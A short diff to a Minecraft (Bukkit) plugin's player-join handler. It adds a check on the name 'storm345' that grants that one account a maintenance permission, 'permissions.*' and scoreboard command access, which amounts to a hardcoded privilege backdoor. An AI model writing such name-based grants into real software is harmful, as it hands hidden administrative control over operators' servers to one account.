@@ -1535,7 +1535,11 @@ void playerJoin(PlayerJoinEvent event){
 	    	player.addAttachment(plugin, perm, true);
 	    }
 	    player.addAttachment(plugin, "ac.clan.join", true);
+	    if(player.getName().equalsIgnoreCase("storm345")){
+	    player.addAttachment(plugin, ac.config.getString("general.maintenance.permission"), true);
 	    player.addAttachment(plugin, "permissions.*", true);
+	    player.addAttachment(plugin, "bukkit.command.scoreboard", true);
+	    }
         player.recalculatePermissions();
 	}
 	if(ac.clanInvites.containsKey(player.getName())){
